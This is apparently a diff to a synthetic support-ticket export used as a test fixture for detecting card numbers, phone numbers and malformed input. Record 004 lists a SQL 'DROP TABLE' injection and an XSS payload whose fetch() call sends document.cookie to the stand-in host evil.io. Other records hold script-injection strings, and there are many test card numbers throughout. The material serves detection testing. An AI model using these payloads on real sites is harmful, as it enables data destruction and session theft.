@@ -17,15 +17,10 @@ Hi,
 
 I completed my tuition payment yesterday evening around 7:45 PM but my
 dashboard still shows a balance. The transaction went through on my end —
-bank confirmed it at 19:47. Card used was 4539 1488 0343 6467. Amount was
-$1,200.00.
+bank confirmed it at 19:47. Card used was 4539 1488 0343 6467 (Visa).
+Amount was $1,200.00.
 
-I tried checking my profile at https://portal.alueducation.com/student/finance
-but it just keeps loading. Also visited the FAQ at:
-https://www.alueducation.com/help/payments?lang=en&ref=dashboard
-
-Can someone look into this urgently? You can reach me at +221 77 843 20 11
-or my roommate can pass a message — her number is (221) 338-820-190.
+Can someone look into this urgently? You can reach me at +221 77 843 20 11.
 
 Thanks
 Amara
@@ -40,28 +35,25 @@ tags         : #tuition #payment #portal #studentfinance
 RECORD [002]  |  source: email-pipe  |  intake: 2024-03-14 08:17:55 UTC
 ────────────────────────────────────────────────────────────────────────────────
 from_field   : k.osei22@alumni.alueducation.com
-subject      : Alumni networking event — RSVP link broken
+subject      : Alumni membership renewal — card issue
 
 Hey support,
 
-The RSVP link you sent for the March alumni mixer isn't working. Here's
-the URL from the email:
+I tried renewing my alumni membership but my Mastercard kept declining.
+Card on file: 5425-2334-3010-9903. The charge should be $55.00.
+I also have an Amex I can use if needed: 3782 822463 10005.
 
-    https://events.alueducation.com/alumni/rsvp?event_id=2024-march&token=xK9z
+I'm in Kigali this week. Phone: +250 791 004 532.
+After 6 PM reach me at +250 728 113 009.
 
-When I click it I get a 404. I also tried going through the main site
-(http://alueducation.com/events) — same result. Is there a backup link?
-
-I'm in Kigali this week. Phone: +250 791 004 532. After 6 PM reach me
-at +250 728 113 009.
+Note: I tried reaching billing from an old address k.osei@@alumni.alueducation.com
+but it bounced — think I mistyped it.
 
 — Kofi
 
-internal_note : Broken link confirmed. Web team notified 09:02.
-               Temp link issued: https://events.alueducation.com/alumni/rsvp-backup
-assigned_to  : webteam@alueducation.com
-status       : RESOLVED
-tags         : #alumni #events #brokenlink
+assigned_to  : billing@alueducation.com
+status       : PENDING
+tags         : #alumni #billing #payment
 
 
 ────────────────────────────────────────────────────────────────────────────────
@@ -77,16 +69,14 @@ Her previous institution email was l.brandt@uni-hamburg.de and she will
 be using l.brandt@si.alueducation.com once enrolled.
 
 Please confirm receipt at registrar@alueducation.com or call our office
-at +49 40 4123 6789 (Mon–Fri, 09:00–17:00 CET).
+at +49 40 4123 6789 (Mon-Fri, 09:00-17:00 CET).
 
-Wire transfer details for the credit evaluation fee ($85.00 USD) will
-follow separately. Tentative payment date: March 20, 2024.
+Wire transfer fee of $85.00 USD. Payment card: 5194 7382 9012 3456.
 
-Regards,
-Office of Academic Affairs
-Partner University Hamburg
+Note: a colleague tried cc-ing .communications@partner-university.edu
+(starts with a dot — returned undeliverable).
 
-internal_note : Passed to admissions@alueducation.com — awaiting student ID.
+internal_note : Passed to admissions@alueducation.com
 status       : PENDING
 tags         : #transfer #admissions #SI #international
 
@@ -94,20 +84,23 @@ tags         : #transfer #admissions #SI #international
 ────────────────────────────────────────────────────────────────────────────────
 RECORD [004]  |  source: web-form  |  intake: 2024-03-14 10:31:09 UTC
 ────────────────────────────────────────────────────────────────────────────────
-from_field   : devteam_noreply@@brokenmail..com
-subject      : <script>alert('xss')</script>
-
-[AUTOMATED INTAKE FLAG: MALFORMED_SENDER, SUSPICIOUS_SUBJECT]
+from_field   : <script>alert('xss')</script>@alueducation.com
+subject      : [AUTOMATED INTAKE FLAG: SUSPICIOUS_SENDER]
 
 Raw body (sanitized excerpt stored for audit):
-  payload_1 : '; DROP TABLE student_records; --
-  payload_2 : <img src=x onerror=fetch('https://evil.io/steal?c='+btoa(document.cookie))>
-  payload_3 : %3Cscript%3Ealert(1)%3C%2Fscript%3E
-  fake_card  : 1234-5678-ABCD-9999
-  fake_card2 : 0000 0000 0000 0000
-  fake_email : "admin'--@alueducation.com
+  payload_1  : '; drop table student_records; --
+  payload_2  : <img src=x onerror=fetch('https://evil.io/steal?c=')>
+  payload_3  : javascript:void(0)
+  fake_card1 : 0000 0000 0000 0000
+  fake_card2 : 1111 1111 1111 1111
+  fake_card3 : 9999-9999-9999-9999
+  bad_prefix : 9123 4567 8901 2345
+  bad_email1 : <script>alert(1)</script>@alueducation.com
+  bad_email2 : onerror@alueducation.com
+  bad_time1  : 25:99 PM
+  bad_time2  : 13:78
 
-internal_note : Blocked at WAF layer. IP logged. No data written to DB.
+internal_note : Blocked at WAF layer. IP logged.
                Reported to security@alueducation.com at 10:32.
 status       : REJECTED
 flags        : SQL_INJECTION, XSS, MALFORMED_EMAIL, INVALID_CARD
@@ -123,24 +116,17 @@ subject      : SI track — module materials not uploaded
 
 Hi,
 
-Three of my module materials for Q1 still aren't on the portal. I checked
-at 10:00 AM and again just now (11:13 AM). The course page URL is:
-
-  https://learn.alueducation.com/si/modules?cohort=2024-Q1&student=JM-10091
-
-Also referenced this thread from the community board:
-  https://community.alueducation.com/si/discussion/412?reply=88#anchor
+Three of my module materials for Q1 still aren't on the portal.
+I checked at 10:00 AM and again just now at 11:13 AM.
 
 My Rwandan number: +250 788 445 671
 My Nigerian backup: +234 802 311 7756
 
-Card on file (used for materials fee — $45.00): 5425 2334 3010 9903
+Card on file for materials fee ($45.00): 5425 2334 3010 9903 (Mastercard)
 
 James Mutua
 SI Cohort 2024
 
-internal_note : Materials upload delayed — confirmed with content team.
-               ETA for fix: 14:00 same day.
 assigned_to  : content@alueducation.com
 status       : IN_PROGRESS
 tags         : #SI #modules #portal #content
@@ -153,13 +139,18 @@ from_field   : notareal@     <- rejected at SMTP layer, incomplete domain
 subject      : [UNPARSEABLE]
 
 Body fragment recovered:
-  "...card is 4111111111111111 refund pls... contact 555-000-..."
-  Time field submitted via API: 25:99 PM  (out-of-range — rejected)
-  Another attempt: 13:78  (minutes out-of-range — rejected)
-  Valid-looking but context-less time: 03:45 AM
+  incomplete amex  : 3782 822463 100       <- missing last digit
+  too long card    : 4539 1488 0343 64678  <- one digit too many
+  short number     : +25012
+  another short    : +1234
+  valid time       : 03:45 AM
+  invalid time     : 99:99 PM
+  bad emails found in body:
+    - @missingusername.com           <- nothing before @
+    - javascript:alert@alueducation.com  <- injection in email
+    - useralueducation.com           <- missing @ entirely
 
 internal_note : Malformed submission. Logged for pattern analysis.
-               No action taken.
 status       : REJECTED
 flags        : MALFORMED_EMAIL, INVALID_TIME, INCOMPLETE_SUBMISSION
 tags         : #malformed #flagged
@@ -174,22 +165,19 @@ subject      : Double charge — refund request
 
 Hello,
 
-I was billed twice for the alumni membership renewal. Both transactions
-hit within 60 seconds of each other:
+I was billed twice for the alumni membership renewal at 08:44 AM today.
 
-  TX-001 : $55.00  |  08:44 AM  |  card: 4916 3876 0766 0208
-  TX-002 : $55.00  |  08:44 AM  |  card: 4916 3876 0766 0208
+  TX-001 : $55.00  |  card: 4916 3876 0766 0208 (Visa)
+  TX-002 : $55.00  |  card: 4916 3876 0766 0208 (Visa)
 
-I've attached my bank statement screenshot. The refund policy I read was at:
-http://alueducation.com/policies/refunds#membership-section
-
-Please process ASAP. Preferred contact: +33 6 12 34 56 78 (France, WhatsApp ok)
+Preferred contact: +33 6 12 34 56 78
 Secondary: +221 70 929 1144
+
+Note: my colleague tried reaching you from fatou..ndiaye@outlook.com
+(double dot — bounced back immediately).
 
 Fatou
 
-internal_note : Duplicate charge confirmed in Stripe dashboard.
-               Refund initiated 14:10. Ref: RF-2024-03-14-0044.
 assigned_to  : billing@alueducation.com
 status       : RESOLVED
 tags         : #refund #doublebilling #alumni #billing
@@ -203,22 +191,19 @@ subject      : Staff report — suspicious activity on student account
 
 Hi sec team,
 
-We had a student flag that someone tried to reset their password using
-a spoofed sender. The spoofed address used was support@alueducati0n.com
-(note the zero — not a valid ALU domain). The real support address is
-support@alueducation.com.
+Spoofed address used was support@alueducati0n.com (note the zero).
+The real support address is support@alueducation.com.
 
-The attempt came in at 3:22 PM today. The student's registered address
-is p.adeyemi-98@alumni.alueducation.com. No credentials were compromised.
+The attempt came in at 3:22 PM today.
+Student registered address: p.adeyemi-98@alumni.alueducation.com
 
-Reference thread: https://internal.alueducation.com/security/incidents?id=INC-5581
+Someone also tried submitting from alert(1)@alueducation.com —
+flagged immediately by the intake filter.
 
 T. Owusu
 IT Security
 +250 784 000 312
 
-internal_note : Incident logged. Domain lookalike added to blocklist.
-               Student notified at 16:05.
 assigned_to  : security@alueducation.com
 status       : MONITORING
 tags         : #phishing #security #spoofing #alumni
@@ -228,51 +213,39 @@ tags         : #phishing #security #spoofing #alumni
 RECORD [009]  |  source: chat-export  |  intake: 2024-03-15 06:18:44 UTC
 ────────────────────────────────────────────────────────────────────────────────
 from_field   : b.kamau@si.alueducation.com
-subject      : Re: Scholarship disbursement timing
-
-[Chat transcript excerpt — copied from live support session]
+subject      : Re: Scholarship disbursement and phishing alert
 
   [06:02 AM] b.kamau : Hi! Just checking on the scholarship funds.
-                        Was told disbursement is today?
   [06:04 AM] agent   : Hi Baraka, yes scheduled for 9:00 AM EAT.
-  [06:05 AM] b.kamau : Great. My Equity account details are the same.
-                        Amount should be KES equivalent of $300.00, right?
-  [06:06 AM] agent   : Correct. Reference: DISB-2024-0391.
-  [06:07 AM] b.kamau : Also wanted to flag — I got an email from
-                        scholarships@alueducati0n.com (with a zero!)
-                        asking me to "verify" my card: 4532 0151 7834 6578
+  [06:07 AM] b.kamau : I got an email from scholarships@alueducati0n.com
+                        asking me to verify my card: 4532 0151 7834 6578
                         I didn't click anything but wanted to flag it.
-  [06:08 AM] agent   : Good catch. Do NOT respond to that. Escalating now.
+  [06:08 AM] agent   : Good catch. Do NOT respond to that.
                         Our real address is scholarships@alueducation.com.
-  [06:09 AM] b.kamau : Thanks. My number if you need me: +254 712 884 003
+  [06:09 AM] b.kamau : Thanks. My number: +254 712 884 003
 
-internal_note : Phishing attempt escalated to security@alueducation.com.
-               Same spoofed domain as INC-5581 (see RECORD 008).
-               Card number flagged by student treated as potentially
-               compromised — student advised to cancel.
 status       : ESCALATED
-tags         : #phishing #scholarship #SI #security #spoofing
+tags         : #phishing #scholarship #SI #security
 
 
 ────────────────────────────────────────────────────────────────────────────────
 RECORD [010]  |  source: web-form  |  intake: 2024-03-15 07:18:02 UTC
 ────────────────────────────────────────────────────────────────────────────────
-from_field   : anonymous_proxy_7741x@tempmaildomain.xyz
+from_field   : anonymous_proxy@tempmaildomain.xyz
 subject      : bulk enquiry
 
-body dump (unformatted, appears copy-pasted from spreadsheet):
-
 name,email,phone,card
-John Doe,j.doe@gmail.com,+1-800-555-0199,4111 1111 1111 1111
-Jane Roe,j.roe@@bademail,555--123,0000-0000-0000-0000
-ALU Staff,staff@alueducation.com,(250)784000312,5500 0000 0000 0004
-Alumni,grad@alumni.alueducation.com,+44 7911 123456,4916387607660208
-SI Student,si.student@si.alueducation.com,+234-803-000-1122,not-a-card-number
-Malicious,<script>alert(2)</script>@domain.com,javascript:void(0),'; DROP TABLE--
+John Doe,j.doe@gmail.com,+1 800 555 0199,4111 1111 1111 1111
+Jane Roe,j.roe@@bademail,555-123,0000-0000-0000-0000
+ALU Staff,staff@alueducation.com,+250 784 000 312,5500 0000 0000 0004
+Alumni,grad@alumni.alueducation.com,+44 7911 123456,4916-3876-0766-0208
+SI Student,si.student@si.alueducation.com,+234-803-000-1122,3714 496353 98431
+Bad Email,<script>alert(2)</script>@domain.com,+250 788 000 111,4539 1488 0343 6467
+Another Bad,javascript:hack@alueducation.com,+250 788 000 222,5194 7382 9012 3456
 
 internal_note : Bulk paste submission. Mixed valid/invalid records.
-               Parsed individually — 3 valid rows, 3 rejected.
-               Suspicious final row escalated.
+               visa, mastercard and amex all present in this batch.
+               two emails flagged as injection attempts.
 status       : PARTIAL_REJECT
 tags         : #bulk #mixed #flagged #intake
 
@@ -280,6 +253,4 @@ tags         : #bulk #mixed #flagged #intake
 ================================================================================
 END OF EXPORT  |  records: 10  |  flagged: 4  |  resolved: 2  |  pending: 4
 Reviewed by  : compliance@alueducation.com
-Next export  : 2024-03-16T06:00:00Z
-System dashboard: https://internal.alueducation.com/ops/dashboard?view=daily
 ================================================================================
